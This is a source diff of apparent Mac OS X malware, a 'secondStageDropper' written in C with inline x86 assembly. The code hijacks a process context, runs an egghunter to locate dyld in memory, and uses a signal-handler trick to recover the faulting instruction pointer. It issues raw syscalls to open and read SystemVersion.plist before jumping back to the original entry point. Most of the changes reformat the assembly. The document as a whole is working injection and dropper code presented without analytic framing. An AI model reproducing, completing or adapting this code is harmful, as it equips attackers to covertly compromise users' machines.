@@ -80,6 +80,7 @@ sdbm (unsigned char *str)
 unsigned int
 findSymbolInFatBinary (byte *imageBase, unsigned int symbolHash)
 {
+	
 #ifdef LOADER_DEBUG
 	printf("[ii] findSymbolInFatBinary!\n");
 #endif
@@ -1161,6 +1162,7 @@ void *mapLibSystemK()
 #endif
 
 	return address;
+
 }
 
 void labelTest ()
@@ -1169,7 +1171,6 @@ void labelTest ()
 
 void secondStageDropper (unsigned long args)
 {
-	
 	unsigned int fd;
 	hijack_context *h_context = (hijack_context *)&args; // "context" saved by pushad
 
@@ -1215,27 +1216,27 @@ init:
 get_pc:
 		call init
 
-			// this is weird, depending on some stars allignment the context's
-			// offset changes and so we just scan the stack for a register we 
-			// know it's not changed by the kernel(ebp)
+		// this is weird, depending on some stars allignment the context's
+		// offset changes and so we just scan the stack for a register we 
+		// know it's not changed by the kernel(ebp)
 sig_handler:
 		mov eax, esp
 sig_loop:
 		add eax, 0x4
-			cmp [eax], ebp
-			jne sig_loop
+		cmp [eax], ebp
+		jne sig_loop
 
-			add eax, 0x4
-			mov esp, eax
-			// now esp points to the faulting ESP value
-			// in the middle of the thread context
+		add eax, 0x4
+		mov esp, eax
+		// now esp points to the faulting ESP value
+		// in the middle of the thread context
 
-			sub [esp], 4		// make room for retaddr
-			mov eax, [esp]		
+		sub [esp], 4		// make room for retaddr
+		mov eax, [esp]		
 
 		mov ebx, [esp+0xc]	// ebx == faulting EIP
 		add ebx, 8			// add to EIP to jump over CMP & JE of egghunter !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-			mov [eax], ebx		// save retaddr
+		mov [eax], ebx		// save retaddr
 
 			// restore registers & return back to the egghunter
 		mov eax, [esp-0x1c]
@@ -1250,6 +1251,8 @@ sig_loop:
 
 l_out:
 	}
+
+	// FIN QUI TUTTOK
 
 	sig.sig_action = 0x41414141;
 	sig.sig_tramp	= sig_handler;
@@ -1278,71 +1281,53 @@ l_out:
 			int 0x80
 			add esp, 0x10
 	}
-
 	// egghunter: scans for the first 0xfeedface from 
 	// 0x8fe00000 to 0x8fff0000
 	__asm__ __volatile__ {
 		mov eax, 0x8fe00000
 l_loop:
 		cmp DWORD PTR [eax], 0xfeedface
-			je found
-			add eax, 0x1000
-			cmp eax, 0x8fff1000
-			jne l_loop
-			mov DWORD PTR [dyldBaseAddress], 0x0
-			jmp l_break
+		je found
+		add eax, 0x1000
+		cmp eax, 0x8fff1000
+		jne l_loop
+		mov DWORD PTR [dyldBaseAddress], 0x0
+		jmp l_break
 found:
 		mov DWORD PTR [dyldBaseAddress], eax
 l_break:
 		nop
 	}
 
+	char SystemVersion[49] = {'/', 'S', 'y', 's', 't', 'e', 'm', '/', 'L', 'i', 'b', 'r', 'a', 'r', 'y', '/', 'C', 'o', 'r', 'e', 'S', 'e', 'r', 'v', 'i', 'c', 'e', 's', '/', 'S', 'y', 's', 't', 'e', 'm', 'V', 'e', 'r', 's', 'i', 'o', 'n', '.', 'p', 'l', 'i', 's', 't', 0x0};
 	// find macosx version
-
-	// open the file
 	__asm__ __volatile__ {
-		push 0x0
-			push 0x7473696c
-			push 0x702e6e6f
-			push 0x69737265
-			push 0x566d6574
-			push 0x7379532f
-			push 0x73656369
-			push 0x76726553
-			push 0x65726f43
-			push 0x2f797261
-			push 0x7262694c
-			push 0x2f6d6574
-			push 0x7379532f	// "/System/Library/CoreServices/SystemVersion.plist"
-			mov eax, esp
-
-			push 0x0
-			push eax
-			mov eax, 0x5
-			push eax
-			int 0x80
-			mov [file_handle], eax
-
-			add esp, 0x40
+		push 0
+		push SystemVersion
+		mov eax, 0x5
+		push eax
+		int 0x80
+		mov [file_handle], eax
+		//add esp, 0x40
+		add esp, 0xc
 	}
 
 	if(file_handle <= 0)
 		goto OEP_CALL;
-
 	// read file
 	__asm__ __volatile__ {
 		push 0x400
-			lea eax, [file_buffer]
+		lea eax, [file_buffer]
 		push eax
-			mov eax, [file_handle]
+		mov eax, [file_handle]
 		push eax
-			mov eax, 0x3
+		mov eax, 0x3
 
-			push eax
-			int 0x80
-			mov [read_len], eax
+		push eax
+		int 0x80
+		mov [read_len], eax
 
-			add esp, 0x10
+		add esp, 0x10
 	}
 
 	if(read_len <= 0)
